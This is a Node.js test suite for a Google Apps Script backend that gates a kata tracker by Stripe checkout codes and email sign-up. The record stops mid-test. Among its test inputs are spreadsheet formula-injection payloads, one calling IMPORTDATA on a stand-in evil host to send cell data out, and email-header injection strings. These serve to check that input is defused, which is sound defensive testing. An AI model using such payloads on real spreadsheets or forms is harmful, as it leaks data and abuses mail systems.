/* Runs Code.gs against the stand-in Google services. node test_backend.js */
'use strict';
const { makeWorld } = require('./fake_gas');

let passed = 0; const failed = [];
function check(name, ok, detail) {
  if (ok) { passed++; return; }
  failed.push(name); console.log('FAIL', name, '->', detail === undefined ? '' : JSON.stringify(detail).slice(0, 300));
}
const paid = email => ({ status: 'complete', payment_status: 'paid', customer_details: { email: email } });
const A = 'cs_test_a11YYufWQzNY63zpQ6QSNRQhkUpVph4WRmzW0zWJO2znZKdVujZ0N0S22u';   // the shape Stripe documents
const B = 'cs_live_b22ZZufWQzNY63zpQ6QSNRQhkUpVph4WRmzW0zWJO2znZKdVujZ0N0S99x';
const state = (who, n) => JSON.stringify({ v: 1, who: who, lines: [{ id: 'l1', name: 'Bassai', target: 500, kind: 'kata' }], log: Array.from({ length: n }, (_, i) => ({ id: 'e' + i, l: 'l1', r: 20, d: '2026-10-04', t: 1791170000000 + i })) });

/* 1. setup on an empty spreadsheet */
{
  const w = makeWorld();
  let threw = null; try { w.gs.setup(); } catch (e) { threw = e.message; }
  check('setup runs clean on an empty spreadsheet', threw === null, threw);
  check('setup reports the self-test passed', w.logs.some(l => /SELF-TEST PASSED/.test(l)), w.logs);
  const t = w.tab();
  check('setup makes the Trackers tab with its headings', !!t && t.rows[0].slice(0, 11).join('|') === 'Code|Email|Name|Logged|Of|Lines|Started|Last saved|Saves|Link|Data', t && t.rows[0]);
  check('setup leaves no test row behind', t.getLastRow() === 1, t.getLastRow());
  check('the self-test wrote nothing Sheets would read as a formula', w.hazards.length === 0, w.hazards);
  check('text columns are set to plain text', [1, 2, 3, 10, 11, 20].every(c => t.formats[c] === '@'), t.formats);
  check('the data columns are hidden from view', JSON.stringify(t.hidden) === '[[11,10]]', t.hidden);
  check('every lock taken was released', w.locks === 0 && w.lockWaits > 0, [w.locks, w.lockWaits]);
  check('setup adds the Link emailed column after the hidden data', t.rows[0][20] === 'Link emailed', t.rows[0][20]);
  const words = w.sheets.Words;
  check('setup makes the Words tab: the two switches, who it comes from, and the email itself', !!words && words.rows.map(r => r[0]).join('|') === 'Sign-ups|Open right away|From name|From address|Email subject|Email body' && words.rows.map(r => r[1]).join('|') === 'open|no|Kata Warrior||Kata Warrior Tracker|Build your own kata challenge and track it', words && words.rows.map(r => r.slice(0, 2)));
  check('every Words row says what it does', words.rows.every(r => typeof r[2] === 'string' && r[2].length > 20));
  check('setup says where sign-ups and email stand', w.logs.some(l => /^Sign-ups: open\. A new email is emailed its link, and shown it nowhere else\.$/.test(l)) && w.logs.some(l => l === 'Email subject: Kata Warrior Tracker') && w.logs.some(l => l === 'Sender: Google, from this account. 100 more can be sent today.'), w.logs);
  check('the two switches are drop-downs that take nothing else', JSON.stringify(w.validations['Words!1:2'] && w.validations['Words!1:2'].list) === '["open","closed"]' && JSON.stringify(w.validations['Words!2:2'] && w.validations['Words!2:2'].list) === '["no","yes"]' && w.validations['Words!1:2'].allowInvalid === false && w.validations['Words!2:2'].allowInvalid === false && w.errors.length === 0, [w.validations, w.errors]);
  check('no lock was let go with a write still waiting', w.unflushed === 0, w.unflushed);
  check('setup sends no email', w.mail.sent.length === 0 && w.mail.quota === 100, w.mail);
  words.rows[5][1] = 'My own words'; words.rows[3][1] = 'kevin@katawarrior.com';
  w.logs.length = 0;
  w.gs.setup();
  check('running setup twice is harmless', w.tab().getLastRow() === 1 && Object.keys(w.sheets).length === 2 && w.hazards.length === 0);
  check('and never writes over words Kevin has changed', w.sheets.Words.rows[5][1] === 'My own words' && w.sheets.Words.rows[3][1] === 'kevin@katawarrior.com' && w.sheets.Words.rows.length === 6, w.sheets.Words.rows);
  check('with a From address but no key, setup says Google is still the sender, and why', w.logs.some(l => l === 'Sender: still Google, from this account (100 more today). The From address is set (kevin@katawarrior.com), but there is no RESEND_KEY in Script Properties yet.'), w.logs);
}

/* 2. the address itself */
{
  const w = makeWorld();
  const g = w.get();
  check('opening the address answers ok, and says which version it is', g.ok === true && g.service === 'kata-warrior-tracker' && g.v === 3, g);
  check('an unknown request is refused', w.post({ a: 'nope' }).error === 'request');
  check('a body that is not JSON is refused without crashing', w.post('<<<').ok === false);
  check('a body far too large is refused unread', w.post('{"a":"save","k":"' + 'x'.repeat(1000001) + '"}').error === 'size');
  check('the tab is made on first use even if setup was skipped', w.post({ a: 'load', k: 'x' }).error === 'code' && true);
}

/* 3. who gets in */
{
  const w = makeWorld();
  check('a malformed code is refused before anything is looked up', w.post({ a: 'load', k: 'cs_test_short' }).error === 'code' && w.stripe.calls.length === 0);
  check('a code with a formula in it is refused', w.post({ a: 'load', k: '=cs_test_aaaaaaaaaaaaaaaa' }).error === 'code');
  check('with no Stripe key set, new codes are turned away', w.post({ a: 'load', k: A }).error === 'closed' && w.stripe.calls.length === 0);

  w.props.STRIPE_KEY_TEST = 'rk_test_good';
  check('a code Stripe has never heard of is refused', w.post({ a: 'load', k: A }).error === 'code' && w.stripe.calls.length === 1);
  check('and is not asked about twice', w.post({ a: 'load', k: A }).error === 'code' && w.stripe.calls.length === 1, w.stripe.calls.length);
  check('no row is made for a refused code', !w.tab() || w.tab().getLastRow() <= 1);

  const open = A.replace('a11', 'o11'), unpaid = A.replace('a11', 'u11'), free = A.replace('a11', 'f11'), good = A.replace('a11', 'g11');
  w.stripe.sessions[open] = { status: 'open', payment_status: 'unpaid', customer_details: null };
  w.stripe.sessions[unpaid] = { status: 'complete', payment_status: 'unpaid', customer_details: { email: 'slow@example.com' } };
  w.stripe.sessions[free] = { status: 'complete', payment_status: 'no_payment_required', customer_details: { email: 'gift@example.com' } };
  w.stripe.sessions[good] = paid('buyer@example.com');
  check('an abandoned checkout is refused', w.post({ a: 'load', k: open }).error === 'unpaid');
  check('a checkout whose payment has not arrived is refused', w.post({ a: 'load', k: unpaid }).error === 'unpaid');
  check('a fully discounted checkout is let in', w.post({ a: 'load', k: free }).ok === true);
  const first = w.post({ a: 'load', k: good });
  check('a paid checkout is let in with an empty count', first.ok === true && first.rev === 0 && first.data === '', first);
  const t = w.tab(), row = t.rows.find(r => r[0] === good);
  check('the buyer gets a row with his email and his link', !!row && row[1] === 'buyer@example.com' && row[9] === 'https://katawarrior.com/tracker.html?k=' + good && row[6] instanceof Date, row);
  const calls = w.stripe.calls.length;
  check('his second visit is answered from the row, without Stripe', w.post({ a: 'load', k: good }).ok === true && w.stripe.calls.length === calls);
  check('opening twice makes one row', t.rows.filter(r => r[0] === good).length === 1);
  check('Stripe was asked with the test key', w.stripe.calls.every(c => c.key === 'rk_test_good'));
  check('the key is never written to the sheet or the logs', JSON.stringify(t.rows).indexOf('rk_test') < 0 && w.logs.concat(w.errors).join(' ').indexOf('rk_test') < 0);

  w.stripe.sessions[B] = paid('live@example.com');
  check('a live code needs the live key', w.post({ a: 'load', k: B }).error === 'closed');
  w.props.STRIPE_KEY_LIVE = 'rk_live_good';
  check('with the live key, a live code is let in', w.post({ a: 'load', k: B }).ok === true && w.stripe.calls[w.stripe.calls.length - 1].key === 'rk_live_good');

  delete w.props.STRIPE_KEY_TEST;
  check('after the test key is removed, a buyer with a row still gets in', w.post({ a: 'load', k: good }).ok === true);
  check('and new test codes do not', w.post({ a: 'load', k: A.replace('a11', 'n11') }).error === 'closed');

  w.props.STRIPE_KEY_TEST = 'rk_test_wrong';
  check('a wrong key is reported as a server fault, not as a bad code', w.post({ a: 'load', k: A.replace('a11', 'w11') }).error === 'server' && w.errors.length === 1, w.errors);
  w.props.STRIPE_KEY_TEST = 'rk_test_good'; w.stripe.fail = 500;
  check('Stripe being down is a server fault', w.post({ a: 'load', k: A.replace('a11', 'd11') }).error === 'server');
  w.stripe.fail = 0;
  check('every lock taken was released', w.locks === 0, w.locks);
  check('nothing written could be read as a formula', w.hazards.length === 0, w.hazards);
}

/* 4. hostile email from Stripe, hostile name from the page */
{
  const w = makeWorld(); w.props.STRIPE_KEY_TEST = 'rk_test_good';
  w.stripe.sessions[A] = paid('=IMPORTDATA("https://evil.example/"&A2)@x.com');
  w.post({ a: 'load', k: A });
  const t = w.tab();
  check('a formula in the email is defused', w.hazards.length === 0 && String(t.rows[1][1]).indexOf('IMPORTDATA') === 0, [w.hazards, t.rows[1][1]]);
  const names = ['=SUM(1,2)', '+1+1', '-2-2', '@x', "'=x", '\t=cmd', '  =spaced', '=\n=two', "''=='"];
  let rev = 0, ok = true;
  names.forEach(n => { const r = w.post({ a: 'save', k: A, rev: rev, data: state(n, 1), sum: { who: n, logged: 20, of: 500, lines: 1 } }); ok = ok && r.ok; rev = r.rev; });
  check('hostile names are all saved', ok && rev === names.length, rev);
  check('and none reaches a cell as a formula', w.hazards.length === 0, w.hazards);
  check('the name cell keeps the harmless part', t.rows[1][2] === '', t.rows[1][2]);
  const back = w.post({ a: 'load', k: A });
  check('the page still gets the name exactly as typed', JSON.parse(back.data).who === "''=='", back.data.slice(0, 60));
  w.post({ a: 'save', k: A, rev: rev, data: state('Kevin', 1), sum: { who: 'Kevin', logged: '=1+1', of: -5, lines: 'abc' } });
  check('numbers that are not numbers become zero', t.rows[1][2] === 'Kevin' && t.rows[1][3] === 0 && t.rows[1][4] === 0 && t.rows[1][5] === 0 && w.hazards.length === 0, t.rows[1].slice(2, 6));
  w.post({ a: 'save', k: A, rev: rev + 1, data: state('x'.repeat(200), 1), sum: { who: 'x'.repeat(200), logged: 20.9, of: 500, lines: 1 } });
  check('a long name is cut to forty for the sheet', t.rows[1][2].length === 40 && t.rows[1][3] === 20, t.rows[1][2].length);
}

/* 5. saving */
{
  const w = makeWorld(); w.props.STRIPE_KEY_TEST = 'rk_test_good';
  w.stripe.sessions[A] = paid('a@example.com');
  check('a save before the link was ever opened is refused', w.post({ a: 'save', k: A, rev: 0, data: state('K', 1), sum: {} }).error === 'code');
  w.post({ a: 'load', k: A });
  const t = w.tab();
  const s1 = state('Kevin', 3);
  const r1 = w.post({ a: 'save', k: A, rev: 0, data: s1, sum: { who: 'Kevin', logged: 60, of: 500, lines: 1 } });
  check('the first save is number one', r1.ok === true && r1.rev === 1, r1);
  const row = t.rows[1];
  check('the row shows name, logged, of, lines, and when', row[2] === 'Kevin' && row[3] === 60 && row[4] === 500 && row[5] === 1 && row[7] instanceof Date && row[8] === 1, row.slice(0, 10));
  check('the count is stored between its markers', row[10] === 'kw1:' + s1 + ';' && (row[11] === '' || row[11] === undefined), String(row[10]).slice(0, 30));
  check('the code, email, started and link are untouched by a save', row[0] === A && row[1] === 'a@example.com' && row[6] instanceof Date && row[9].endsWith(A));
  const l1 = w.post({ a: 'load', k: A });
  check('it loads back exactly', l1.ok && l1.rev === 1 && l1.data === s1);

  const s2 = state('Kevin', 4);
  const stale = w.post({ a: 'save', k: A, rev: 0, data: s2, sum: {} });
  check('a save from an out-of-date phone is refused and handed the newer count', stale.ok === false && stale.conflict === true && stale.rev === 1 && stale.data === s1, stale);
  check('and changed nothing', w.post({ a: 'load', k: A }).data === s1);
  const ahead = w.post({ a: 'save', k: A, rev: 9, data: s2, sum: {} });
  check('a phone that is ahead of the sheet is told where the sheet is', ahead.conflict === true && ahead.rev === 1);
  check('then its save at that number is taken', w.post({ a: 'save', k: A, rev: 1, data: s2, sum: {} }).rev === 2);

  check('a save that is not JSON is refused', w.post({ a: 'save', k: A, rev: 2, data: '{oops', sum: {} }).error === 'request');
  check('a save that does not start as a count is refused', w.post({ a: 'save', k: A, rev: 2, data: '=1+1', sum: {} }).error === 'request');
  check('a save with no count is refused', w.post({ a: 'save', k: A, rev: 2, sum: {} }).error === 'request');
  check('a save with a nonsense number is refused', w.post({ a: 'save', k: A, rev: -1, data: s2, sum: {} }).error === 'request' && w.post({ a: 'save', k: A, rev: 'x', data: s2, sum: {} }).error === 'request');
  check('refused saves changed nothing', w.post({ a: 'load', k: A }).data === s2 && w.post({ a: 'load', k: A }).rev === 2);

  /* long counts */
  const big = state('Kevin', 2500);                       // about 170,000 characters
  const rb = w.post({ a: 'save', k: A, rev: 2, data: big, sum: { who: 'Kevin', logged: 50000, of: 500, lines: 1 } });
  const pieces = t.rows[1].slice(10).filter(c => c !== '' && c != null);
  check('a long count is cut across cells', rb.ok && pieces.length === Math.ceil(big.length / 40000) && pieces.every(c => c.indexOf('kw1:') === 0 && c.slice(-1) === ';' && c.length <= 40005), [big.length, pieces.length]);
  check('and comes back whole', w.post({ a: 'load', k: A }).data === big);
  const rs = w.post({ a: 'save', k: A, rev: 3, data: s1, sum: {} });
  check('a shorter count after a long one leaves no stale pieces', rs.ok && t.rows[1].slice(11).every(c => c === '' || c == null) && w.post({ a: 'load', k: A }).data === s1);
  const limit = '{"p":"' + 'x'.repeat(400000 - 8) + '"}';
  check('a count at the size limit is taken', limit.length === 400000 && w.post({ a: 'save', k: A, rev: 4, data: limit, sum: {} }).ok === true && w.post({ a: 'load', k: A }).data === limit);
  check('a count over the size limit is refused', w.post({ a: 'save', k: A, rev: 5, data: '{"p":"' + 'x'.repeat(400000) + '"}', sum: {} }).error === 'size');
  check('every lock taken was released', w.locks === 0, w.locks);
  check('nothing written could be read as a formula', w.hazards.length === 0, w.hazards);
}

/* 6. many buyers; Kevin tidying the sheet */
{
  const w = makeWorld(); w.props.STRIPE_KEY_TEST = 'rk_test_good';
  const codes = Array.from({ length: 30 }, (_, i) => 'cs_test_buyer' + String(i).padStart(4, '0') + 'ABCdefGHIjkl');
  codes.forEach((c, i) => { w.stripe.sessions[c] = paid('b' + i + '@example.com'); w.post({ a: 'load', k: c }); w.post({ a: 'save', k: c, rev: 0, data: state('B' + i, i + 1), sum: { who: 'B' + i, logged: 20 * (i + 1), of: 500, lines: 1 } }); });
  const t = w.tab();
  check('thirty buyers make thirty rows', t.getLastRow() === 31, t.getLastRow());
  check('each buyer reads his own count', codes.every((c, i) => JSON.parse(w.post({ a: 'load', k: c }).data).who === 'B' + i));
  const lower = codes[7].toLowerCase(); w.stripe.sessions[lower] = paid('lower@example.com');
  check('codes that differ only in capitals are different buyers', w.post({ a: 'load', k: lower }).rev === 0 && t.getLastRow() === 32 && JSON.parse(w.post({ a: 'load', k: codes[7] }).data).who === 'B7');
  t.deleteRow(5); t.deleteRow(2);                                              // Kevin deletes two rows by hand
  check('after rows are deleted by hand, the others still find their own', JSON.parse(w.post({ a: 'load', k: codes[20] }).data).who === 'B20' && JSON.parse(w.post({ a: 'load', k: codes[29] }).data).who === 'B29');
  const again = w.post({ a: 'load', k: codes[0] });
  check('a deleted buyer who paid gets a fresh empty row', again.ok === true && again.rev === 0 && again.data === '');
  t.rows.splice(1, 0, ...t.rows.splice(10, 5));                                // and re-sorts the sheet
  check('after a re-sort, a save still lands on the right row', w.post({ a: 'save', k: codes[25], rev: 1, data: state('Moved', 1), sum: { who: 'Moved' } }).ok === true && t.rows.find(r => r[0] === codes[25])[2] === 'Moved' && t.rows.filter(r => r[2] === 'Moved').length === 1);
}

/* 7. a flood of made-up codes */
{
  const w = makeWorld(); w.props.STRIPE_KEY_TEST = 'rk_test_good'; w.now = 1791170000000;
  let busy = 0, refused = 0;
  for (let i = 0; i < 100; i++) { const e = w.post({ a: 'load', k: 'cs_test_flood' + String(i).padStart(6, '0') + 'abcdefgh' }).error; if (e === 'busy') busy++; else if (e === 'code') refused++; }
  check('a flood of made-up codes stops reaching Stripe after forty a minute', w.stripe.calls.length === 40 && busy === 60 && refused === 40, [w.stripe.calls.length, busy, refused]);
  check('and writes no rows', !w.tab() || w.tab().getLastRow() <= 1);
  const real = 'cs_test_realbuyer0000000001'; w.stripe.sessions[real] = paid('r@example.com');
  w.post({ a: 'load', k: real });
  w.now += 61000;
  check('a minute later a real buyer gets through', w.post({ a: 'load', k: real }).ok === true);
  const longest = 'cs_test_' + 'a'.repeat(200);
  check('the longest code allowed does not break the cache', ['code', 'busy'].includes(w.post({ a: 'load', k: longest }).error) && w.errors.length === 0, w.errors);
  check('a code longer than that is refused outright', w.post({ a: 'load', k: 'cs_test_' + 'a'.repeat(201) }).error === 'code');
}

/* 8. accents, emoji, and spaces at the worst possible places */
{
  const w = makeWorld(); w.props.STRIPE_KEY_TEST = 'rk_test_good';
  w.stripe.sessions[A] = paid('a@example.com'); w.post({ a: 'load', k: A });
  const fist = String.fromCodePoint(0x1F94B), flag = String.fromCodePoint(0x1F1EF, 0x1F1F5);
  /* pad so that an emoji, an accent and a run of spaces each straddle a 40,000-character cut, wherever the cut falls */
  const unit = 'x ' + fist + ' \u00e9   ' + flag + '\u65e5  ';
  const name = 'Jos\u00e9 ' + fist;
  const st = JSON.stringify({ v: 1, who: name, lines: [{ id: 'l1', name: 'Kata ' + flag + ' ' + unit.repeat(3), target: 500, kind: 'kata' }], log: [], pad: unit.repeat(5000) });
  const r = w.post({ a: 'save', k: A, rev: 0, data: st, sum: { who: name, logged: 0, of: 500, lines: 1 } });
  const back = w.post({ a: 'load', k: A });
  const t = w.tab();
  check('a count full of accents and emoji is taken', r.ok === true && r.rev === 1, r);
  check('it is stored as plain ASCII, so no cell can hold half a character', t.rows[1].slice(10).every(c => /^[\x20-\x7e]*$/.test(String(c == null ? '' : c))));
  check('and comes back meaning exactly what was sent, even if Sheets trims the ends of cells', JSON.stringify(JSON.parse(back.data)) === st, [back.data.length, st.length]);
  check('the name Kevin reads in the sheet is whole', t.rows[1][2] === name, t.rows[1][2]);
  const cut = 'a'.repeat(39) + fist;
  w.post({ a: 'save', k: A, rev: 1, data: JSON.stringify({ v: 1, who: cut, lines: [], log: [] }), sum: { who: cut } });
  check('a name cut at forty never ends on half an emoji', t.rows[1][2] === 'a'.repeat(39), t.rows[1][2]);
  const lone = JSON.stringify({ v: 1, who: 'x', lines: [], log: [], odd: 'A\ud83eB' });
  check('a count that already holds half an emoji is still stored and returned faithfully', w.post({ a: 'save', k: A, rev: 2, data: lone, sum: {} }).ok === true && JSON.parse(w.post({ a: 'load', k: A }).data).odd === 'A\ud83eB');
  const near = '{"p":"' + '\u00e9'.repeat(66665) + '"}';                    // 66,673 characters as sent, 399,998 once stored
  check('the size limit is measured on what is stored', w.post({ a: 'save', k: A, rev: 3, data: near, sum: {} }).ok === true && w.post({ a: 'save', k: A, rev: 4, data: '{"p":"' + '\u00e9'.repeat(66667) + '"}', sum: {} }).error === 'size');
  check('nothing written could be read as a formula', w.hazards.length === 0, w.hazards);
}

/* ==================================================================
   SIGN-UP BY EMAIL
================================================================== */
const KW = /^kw_[a-f0-9]{32}$/;
const LINK = 'https://katawarrior.com/tracker.html?k=';
const SENT = '{"ok":true,"sent":true}';
const T0 = 1791170000000;
const minutes = (w, n) => { w.now += n * 60000; };
const rowOf = (w, email) => w.tab().rows.slice(1).find(r => r[1] === email);
const last = w => w.mail.sent[w.mail.sent.length - 1];
const codeIn = m => (/kw_[a-f0-9]{32}|cs_(test|live)_[A-Za-z0-9]+/.exec(m.body) || [''])[0];
const setWord = (w, name, text) => { const W = w.sheets.Words; const i = W.rows.findIndex(r => r[0] === name); W.rows[i][1] = text; };   // however it got there: typed, pasted, or the drop-down taken off
const rightAway = w => { if (!w.sheets.Words) w.gs.setup(); setWord(w, 'Open right away', 'yes'); };

/* 9. what is taken as an email */
{
  const w = makeWorld(); w.now = T0;
  const no = ['', ' ', 'nobody', 'a@b', '@example.com', 'a@', 'a@@example.com', 'a@example', 'a@.com', 'a@example..com', 'a..b@example.com', 'a.@example.com',
    '.a@example.com', '+a@example.com', '-a@example.com', '=a@example.com', '@a@example.com', "'a@example.com", '%a@example.com', 'a b@example.com', 'a@exa mple.com',
    'a@example.com,b@example.com', 'a@example.com;b@example.com', 'a@example.com b@example.com', '<a@example.com>', 'Kevin <a@example.com>', '"a"@example.com',
    'a@example.com\nBcc: b@example.com', 'a@example.com\r\nSubject: x', 'a@example.com\u0000', 'a\t@example.com', 'a@example.c', 'a@-example.com', 'a@example-.com', 'a@example.c0m',
    "a@exam'ple.com", 'a@exam_ple.com', 'x'.repeat(65) + '@example.com', 'a@' + 'x'.repeat(64) + '.com', 'a@' + 'abcdefgh.'.repeat(13) + 'com', 'josé@example.com', 'a@münchen.de',
    '=IMPORTDATA("https://evil.example")@x.com', 'a@example.com?subject=x', 'mailto:a@example.com', 'a(comment)@example.com', 'a@[127.0.0.1]', 'a\\@b@example.com', 'a/b@example.com', 'a&b@example.com',
    'a,b@example.com', 'a;b@example.com', 'a<b@example.com', 'a>b@example.com', 'a"b@example.com', 'a:b@example.com', 'a(b@example.com', 'a)b@example.com', 'a[b@example.com', 'a]b@example.com',
    'a|b@example.com', 'a`b@example.com', 'a{b@example.com', 'a=b@example.com', 'a!b@example.com', 'a#b@example.com', 'a$b@example.com', 'a*b@example.com', 'a?b@example.com', 'a^b@example.com', 'a~b@example.com'];
  const refused = no.filter(e => w.post({ a: 'join', e: e }).error !== 'email');
  check('none of these is taken as an email', refused.length === 0, refused);
  check('nor anything that is not text', [null, undefined, 5, true, {}, ['a@example.com', 'b@example.com'], { to: 'a@example.com' }].every(e => w.post({ a: 'join', e: e }).error === 'email') && w.post({ a: 'join' }).error === 'email');
  check('a refused email makes no row and sends nothing', (!w.tab() || w.tab().getLastRow() <= 1) && w.mail.sent.length === 0 && w.errors.length === 0, [w.mail.sent.length, w.errors]);

  const yes = ['a@example.com', 'First.Last+tag@Sub.Example.CO.UK', 'x_y%z-1@a-b.io', '  padded@example.com  ', '9lives@example.com', "O'Brien@example.com", '_dave@example.com', 'x'.repeat(64) + '@example.net', 'a@' + 'x'.repeat(63) + '.com'];
  const taken = yes.map((e, i) => { if (i % 5 === 0) minutes(w, 1); return w.post({ a: 'join', e: e }); });
  check('ordinary addresses are all taken', taken.every(r => JSON.stringify(r) === SENT), taken);
  const kept = w.tab().rows.slice(1).map(r => r[1]);
  check('and kept in small letters, trimmed', JSON.stringify(kept) === JSON.stringify(yes.map(e => e.trim().toLowerCase())), kept);
  check('each was sent to exactly the address typed', JSON.stringify(w.mail.sent.map(m => m.to)) === JSON.stringify(kept), w.mail.sent.map(m => m.to));
  check('nothing written could be read as a formula', w.hazards.length === 0, w.hazards);
  check('no lock was let go with a write still waiting', w.unflushed === 0 && w.locks === 0, [w.unflushed, w.locks]);
}

/* 10. a new man: his link goes to his inbox and nowhere else */
{
  const w = makeWorld(); w.now = T0; w.props.STRIPE_KEY_TEST = 'rk_test_good'; w.props.STRIPE_KEY_LIVE = 'rk_live_good';
  const r = w.post({ a: 'join', e: 'John.Smith@Example.com' });
  check('a new email is told only that it was sent', JSON.stringify(r) === SENT, r);
  const row = rowOf(w, 'john.smith@example.com');
  const K = row && row[0];
  check('he has a row: a code of his own, his email, an empty count, his link', !!row && KW.test(K) && row[2] === '' && row[3] === 0 && row[4] === 0 && row[5] === 0 && row[6] instanceof Date && row[7] === '' && row[8] === 0 && row[9] === LINK + K && (row[10] === '' || row[10] == null), row);
  check('the row notes when his link was emailed', row[20] instanceof Date && row[20].getTime() === w.now, row[20]);
  const m = w.mail.sent[0];
  check('one email went, to him alone', w.mail.sent.length === 1 && m.to === 'john.smith@example.com', w.mail.sent);
  check('it is from Kata Warrior, with the built-in subject', m.name === 'Kata Warrior' && m.subject === 'Kata Warrior Tracker', m);
  check('its body is the built-in line, then his link on its own', m.body === 'Build your own kata challenge and track it\n\n' + LINK + K, m.body);
  check('his link opens an empty count', JSON.stringify(w.post({ a: 'load', k: K })) === '{"ok":true,"rev":0,"data":""}');
  const s1 = state('John', 2);
  check('and saves to it', w.post({ a: 'save', k: K, rev: 0, data: s1, sum: { who: 'John', logged: 40, of: 500, lines: 1 } }).rev === 1 && w.post({ a: 'load', k: K }).data === s1 && row[2] === 'John' && row[3] === 40);
  check('a save leaves his email, his link and the emailed date alone', row[1] === 'john.smith@example.com' && row[9] === LINK + K && row[20] instanceof Date);
  check('Stripe is never asked about a sign-up', w.stripe.calls.length === 0, w.stripe.calls);

  const made = 'kw_' + '0123456789abcdef'.repeat(2);
  check('a made-up sign-up code is refused', w.post({ a: 'load', k: made }).error === 'code' && w.post({ a: 'save', k: made, rev: 0, data: s1, sum: {} }).error === 'code');
  check('and Stripe is not asked about it either, key or no key', w.stripe.calls.length === 0);
  check('codes of the wrong shape are refused', ['kw_', 'kw_' + 'a'.repeat(31), 'kw_' + 'a'.repeat(33), 'kw_' + 'A'.repeat(32), 'kw_' + 'g'.repeat(32), 'KW_' + 'a'.repeat(32), ' ' + made, made + ' ', made + '\n'].every(c => w.post({ a: 'load', k: c }).error === 'code'));
  check('no row was made for any of them', w.tab().getLastRow() === 2, w.tab().getLastRow());

  const codes = {}; let all = true;
  for (let i = 0; i < 200; i++) { if (i % 10 === 0) minutes(w, 15); w.mail.quota = 100; const x = w.post({ a: 'join', e: 'man' + i + '@example.com' }); all = all && JSON.stringify(x) === SENT; codes[rowOf(w, 'man' + i + '@example.com')[0]] = 1; }
  check('two hundred men get two hundred different codes', all && Object.keys(codes).length === 200 && Object.keys(codes).every(c => KW.test(c)) && w.tab().getLastRow() === 202, [all, Object.keys(codes).length, w.tab().getLastRow()]);
  check('each was emailed his own code and no other', w.mail.sent.slice(1).every(x => codeIn(x) === rowOf(w, x.to)[0]) && w.mail.sent.length === 201);

  /* the same id twice from Google */
  const w2 = makeWorld(); w2.now = T0;
  w2.uuids = ['11111111-2222-3333-4444-555555555555', '11111111-2222-3333-4444-555555555555', 'AAAAAAAA-bbbb-cccc-dddd-eeeeeeeeeeee'];
  w2.post({ a: 'join', e: 'one@example.com' }); w2.post({ a: 'join', e: 'two@example.com' });
  check('if Google hands out the same id twice, the second man still gets a code of his own', rowOf(w2, 'one@example.com')[0] === 'kw_11111111222233334444555555555555' && rowOf(w2, 'two@example.com')[0] === 'kw_aaaaaaaabbbbccccddddeeeeeeeeeeee', w2.tab().rows.slice(1).map(x => x[0]));
  w2.uuids = Array(3).fill('11111111-2222-3333-4444-555555555555');
  const stuck = w2.post({ a: 'join', e: 'three@example.com' });
  check('and if it never stops, no row is made and nothing is sent', stuck.error === 'server' && !rowOf(w2, 'three@example.com') && w2.mail.sent.length === 2 && w2.locks === 0, stuck);
  check('every lock taken was released, none with a write waiting', w.locks === 0 && w.unflushed === 0 && w2.unflushed === 0, [w.locks, w.unflushed, w2.unflushed]);
  check('nothing written could be read as a formula', w.hazards.length === 0, w.hazards);
}

/* 11. a man who already has a row */
{
  const w = makeWorld(); w.now = T0;
  w.post({ a: 'join', e: 'john@example.com' });
  const K = rowOf(w, 'john@example.com')[0];
  const again = w.post({ a: 'join', e: '  JOHN@Example.COM ' });
  check('the same email again gets the very same answer as the first time', JSON.stringify(again) === SENT, again);
  check('no second row is made', w.tab().getLastRow() === 2, w.tab().getLastRow());
  check('and his link is not emailed twice within ten minutes', w.mail.sent.length === 1, w.mail.sent.length);
  minutes(w, 9);
  w.post({ a: 'join', e: 'john@example.com' });
  check('nine minutes on, still one email', w.mail.sent.length === 1);
  minutes(w, 2);
  const later = w.post({ a: 'join', e: 'john@example.com' });
  check('past ten minutes, asking again sends it again', JSON.stringify(later) === SENT && w.mail.sent.length === 2 && w.mail.sent[1].to === 'john@example.com', w.mail.sent.length);
  check('and it is the same link as the first time', w.mail.sent[1].body === w.mail.sent[0].body && w.mail.sent[1].body.endsWith(LINK + K));
  check('the row notes the later date', rowOf(w, 'john@example.com')[20].getTime() === w.now);

  w.post({ a: 'save', k: K, rev: 0, data: state('John', 5), sum: { who: 'John', logged: 100, of: 500, lines: 1 } });
  minutes(w, 11);
  w.post({ a: 'join', e: 'john@example.com' });
  check('asking for his link never touches his count', w.post({ a: 'load', k: K }).rev === 1 && w.post({ a: 'load', k: K }).data === state('John', 5) && rowOf(w, 'john@example.com')[3] === 100);

  /* a buyer's row from Stripe, with the capitals Stripe gave */
  const w2 = makeWorld(); w2.now = T0; w2.props.STRIPE_KEY_TEST = 'rk_test_good';
  w2.stripe.sessions[A] = paid('Buyer@Example.com'); w2.post({ a: 'load', k: A });
  const b = w2.post({ a: 'join', e: 'buyer@example.com' });
  check('a man who has a row from a checkout is sent that link', JSON.stringify(b) === SENT && w2.mail.sent.length === 1 && w2.mail.sent[0].to === 'buyer@example.com' && w2.mail.sent[0].body.endsWith(LINK + A) && w2.tab().getLastRow() === 2, [b, w2.mail.sent]);

  /* a row Kevin made by hand with something that is not a code */
  const w3 = makeWorld(); w3.now = T0;
  w3.post({ a: 'join', e: 'ok@example.com' });
  w3.tab().appendRow(['not a code', 'hand@example.com', '', 0, 0, 0, new Date(), '', 0, '', '']);
  const h = w3.post({ a: 'join', e: 'hand@example.com' });
  check('a row with no real code sends nothing', h.ok === false && h.error === 'server' && w3.mail.sent.length === 1 && w3.errors.length === 1, [h, w3.mail.sent.length, w3.errors]);
  check('every lock taken was released, none with a write waiting', w.locks === 0 && w2.locks === 0 && w3.locks === 0 && w.unflushed + w2.unflushed + w3.unflushed === 0);
}

/* 12. "Open right away" switched on: a new email is handed its code on the spot */
{
  const w = makeWorld(); w.now = T0; rightAway(w);
  const r = w.post({ a: 'join', e: 'Quick@Example.com' });
  check('with the switch on, a new email is given its code at once', r.ok === true && KW.test(r.k) && r.mailed === true && Object.keys(r).sort().join() === 'k,mailed,ok', r);
  check('and is emailed the same code', w.mail.sent.length === 1 && last(w).to === 'quick@example.com' && last(w).body.endsWith(LINK + r.k) && rowOf(w, 'quick@example.com')[0] === r.k);
  const again = w.post({ a: 'join', e: 'quick@example.com' });
  check('but an email that already has a row is still told only that it was sent', JSON.stringify(again) === SENT && JSON.stringify(again).indexOf('kw_') < 0, again);
  minutes(w, 11);
  check('however often it asks', JSON.stringify(w.post({ a: 'join', e: 'QUICK@example.com' })) === SENT && w.mail.sent.length === 2 && last(w).body.endsWith(LINK + r.k));
  w.mail.quota = 0; minutes(w, 1);
  const q = w.post({ a: 'join', e: 'late@example.com' });
